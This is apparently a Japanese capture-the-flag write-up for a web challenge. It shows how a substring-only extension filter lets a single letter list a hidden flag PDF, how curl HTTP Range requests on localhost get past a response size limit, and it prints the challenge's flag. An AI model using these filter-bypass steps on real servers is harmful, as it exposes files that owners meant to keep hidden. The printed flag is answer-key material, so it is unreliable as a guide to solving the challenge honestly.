## 解法
アクセスすると、選択した拡張子のファイルが表示されることがわかる。

`.` や `%2e` を入れるが通らない。
ソースコードを見ると、filter 時にチェックされているのは suffix ではなく その文字列を含むかのみなので 、a~zまでの文字を1文字ずつ入れてあげると flag が露出する。

例えば、 `http://{target_url}/?file_extension=a`

しかし、`/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf` にアクセスするとファイルサイズが大きすぎて上書きされていることがわかる。

サイズ制限があるので、HTTP Range Requestを渡す。

```
curl -X GET -H 'Range: bytes=0-10239' http://localhost/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf --output - > 0.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10240    0 10240    0     0  1111k      0 --:--:-- --:--:-- --:--:-- 1111k
```

10240 bytes しっかり全部取れているので、次のchunkをみる。

```
curl -X GET -H 'Range: bytes=10240-20479' http://localhost/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf --output - > 1.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5845    0  5845    0     0   815k      0 --:--:-- --:--:-- --:--:--  815k
```

5845 bytes なので、これで全てっぽい。


catでくっつける。

```
cat 0.pdf 1.pdf > ans.pdf
```

ans.pdfを見る

## ctf4b{r4nge_reque5t_1s_u5efu1!}
